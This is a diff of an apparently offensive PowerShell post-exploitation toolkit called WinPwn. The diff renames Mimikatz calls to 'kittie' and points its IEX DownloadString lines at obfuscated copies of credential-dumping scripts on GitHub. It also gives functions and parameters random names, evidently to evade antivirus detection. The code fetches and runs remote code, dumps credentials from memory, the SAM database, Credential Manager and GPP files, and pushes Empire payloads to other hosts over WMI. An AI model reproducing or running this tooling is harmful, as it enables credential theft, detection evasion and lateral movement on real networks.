@@ -230,7 +230,7 @@ function sessionGopher {
 }
 
 
-function Mimikatzlocal {
+function kittielocal {
 <#
     .DESCRIPTION
         Dumps Credentials from Memory / SAM Database.
@@ -578,18 +578,18 @@ function privescmodules
     pathcheck
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/locksher.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/UpPower.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1')
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/GPpass.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/AutoGP.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
 
     Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-    Invoke-WCMDump >> $currentPath\LocalPrivesc\WCMCredentials.txt
+    Gorey >> $currentPath\LocalPrivesc\WCMCredentials.txt
 
     Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'
 
     Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
-    Get-GPPAutologon >> $currentPath\LocalPrivesc\GPP_Auto.txt
-    Get-GPPPassword >> $currentPath\LocalPrivesc\GPP_Passwords.txt
+    amazon >> $currentPath\LocalPrivesc\GPP_Auto.txt
+    Shockley >> $currentPath\LocalPrivesc\GPP_Passwords.txt
 
     Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
     families >> $currentPath\LocalPrivesc\All_Localchecks.txt
@@ -653,11 +653,11 @@ function latmov
     fuller >> $currentPath\Exploitation\LocalAdminAccess.txt
 
     $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
-    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "mimikatz" -or $exploitdecision -eq "Credentials")
+    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "kittie" -or $exploitdecision -eq "Credentials")
     {
-        #MassMimikatz
-        $massmimikatz = Read-Host -Prompt 'Do you want to use MassMimikatz for all found Systems? (yes/no)'
-        if ($massmimikatz -eq "yes" -or $massmimikatz -eq "y" -or $massmimikatz -eq "Yes" -or $massmimikatz -eq "Y")
+        #Masskittie
+        $masskittie = Read-Host -Prompt 'Do you want to use Masskittie for all found Systems? (yes/no)'
+        if ($masskittie -eq "yes" -or $masskittie -eq "y" -or $masskittie -eq "Yes" -or $masskittie -eq "Y")
         {
            if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
            {
@@ -693,8 +693,7 @@ function empirelauncher
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-WmiCommand.ps1')
-    #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1') maybe an alternative later on.
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/wmicmd.ps1')
     if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
     {
         $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
@@ -733,12 +732,12 @@ function empirelauncher
 
     if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
     {
-        $Hosts | Invoke-WmiCommand -Payload $Payload
+        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload
     }
     else 
     {
         $Credential = Get-Credential
-        $Hosts | Invoke-WmiCommand -Payload $Payload -Credential $Credential
+        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
     }
 }
 
@@ -879,10 +878,10 @@ function WinPwn
     
     if (isadmin)
     {
-        $Mimidump = Read-Host -Prompt 'You are local Administrator. Do you want to dump local Passwords with Invoke-Mimikatz? (yes/no)'
+        $Mimidump = Read-Host -Prompt 'You are local Administrator. Do you want to dump local Passwords with Invoke-kittie? (yes/no)'
         if ($Mimidump -eq "yes" -or $Mimidump -eq "y" -or $Mimidump -eq "Yes" -or $Mimidump -eq "Y")
         {
-            Mimikatzlocal
+            kittielocal
         }
         else{Write-Host -ForegroundColor Yellow 'Boring...'}
     }
